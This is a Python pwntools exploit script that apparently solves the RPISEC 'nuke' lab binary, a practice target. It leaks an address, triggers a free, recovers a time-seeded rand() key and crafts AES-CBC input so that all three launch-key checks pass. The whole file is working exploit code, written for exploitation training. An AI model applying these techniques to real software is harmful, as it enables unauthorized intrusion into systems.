import ctypes
import sys

from pwn import *

import mycrypto


p = process(["./rpisec_nuke"], env={"LD_PRELOAD": "./usleep.so"})
log.info(util.proc.pidof(p))

# Get session ID (e.g. buf)
p.recvuntil("LAUNCH SESSION ")
p.recv(16)
buf = p.recv(10)
buf_addr = int(buf)
log.info("Got buf address/session id {:#x}".format(buf_addr))

# Enter and then get wrong session in key3 to trigger `free`
p.sendline("3")
p.recvuntil("CONFIRM LAUNCH")
p.sendline("bogus")
p.recvuntil("INVALID")
p.sendline("")

# Now go to key 2 and enter a known input as the key
p.sendline("2")
p.recvuntil("ENTER AES-128 CRYPTO KEY:")
p.sendline("CAFEBABE"*4)
p.recvuntil("ENTER LENGTH")
p.sendline("32")
p.recvuntil("ENTER DATA")
p.sendline(" "*32)
p.recvuntil("AUTHENTICATION FAILED")
p.sendline("")

# Get the challenge, xor out our key and find the seed
def read_challenge():
    p.recvuntil("64 Bytes):")
    p.recv(38)
    challenge = []
    log.info("Reading in challenge")
    for line in range(4):
        buf=p.recv(47)
        print(buf)
        challenge.extend([chr(int(x, 16)) for x in buf.split(".")])
        p.recv(31)

    challenge = "".join(challenge)
    return challenge

p.sendline("3")
challenge = read_challenge()

p.recvuntil("TIME NOW:")
p.recv(8)
time_now = int(p.recv(10))
log.info("Got time now: {}".format(time_now))

# Find the correct seed:
libc = ctypes.cdll.LoadLibrary("libc.so.6")
# -- First dword is the result of the first rand() xored with the supplied
#    plaintext from key2 (four spaces)
first_dword = u32(challenge[0:4]) ^ 0x20202020
log.info("Trying to match challenge 0x{:08x}".format(first_dword))
for seed in range(time_now - 60 + buf_addr, time_now + buf_addr + 1):
    libc.srand(seed)
    r = libc.rand()
    # log.info("Seed {} rand 0x{:08x}".format(seed, r))
    if first_dword == r:
        log.info("Seed {} worked!".format(seed))
        break
else:
    log.info("Couldn't find matching seed :(")
    sys.exit(0)

# Now find the crowell key
enc_key = challenge[48:]
libc.srand(seed)
for i in range(12):
    r = libc.rand()
crowell_key = "".join([p32(libc.rand() ^ u32(enc_key[i*4:i*4+4])) for i in range(4)])
log.info("Leaked crowell key {}".format(crowell_key.encode("hex")))

p.recvuntil("YOUR RESPONSE")
p.sendline("bogus")
p.recvuntil("AUTHENTICATION FAILURE")
p.sendline("")

# Submit it for key2
p.sendline("2")
p.recvuntil("ENTER AES-128 CRYPTO KEY")
p.sendline(crowell_key.encode("hex"))
p.recvuntil("ENTER LENGTH")
p.sendline("32")

# Now we want to provide data that will encrypt to a value that contains key 3's check '31337' at the start
# of the second block. By putting nullbytes between we can still pass the key2 strcmp.

iv = "CFFAEDFEDEC0ADDEFECABEBA0BB0550A".decode("hex")
b1 = "KING CROWELL\x00\x00\x00\x00"
assert len(b1) == 16

ct = mycrypto.aes_encrypt_cbc(b1, crowell_key, iv)
ct += "\x37\x13\x03\x00" + "\x00" * 12
assert len(ct) == 32

pt = mycrypto.aes_decrypt_cbc(ct, crowell_key, iv)
assert pt.startswith("KING CROWELL")
ct_again = mycrypto.aes_encrypt_cbc(pt, crowell_key, iv)
assert ct_again[16:20] == "\x37\x13\x03\x00"

p.recvuntil("ENTER DATA")
p.sendline(pt)
p.recvuntil("CRYPTO KEY AUTHENTICATED")
log.info("Done key 2")
p.sendline("")

# Now solve key3
p.sendline("3")
p.recvuntil("YOUR RESPONSE:")
p.sendline("bogus")
p.recvuntil("KEY AUTHENTICATED")
log.info("Done key 3")
p.sendline("")

# Solve key 1
p.sendline("1")
p.recvuntil("INSERT LAUNCH KEY:")
p.sendline("\x00")
p.recvuntil("KEY AUTHENTICATED")
log.info("Done key 1")
p.sendline("")

p.interactive()
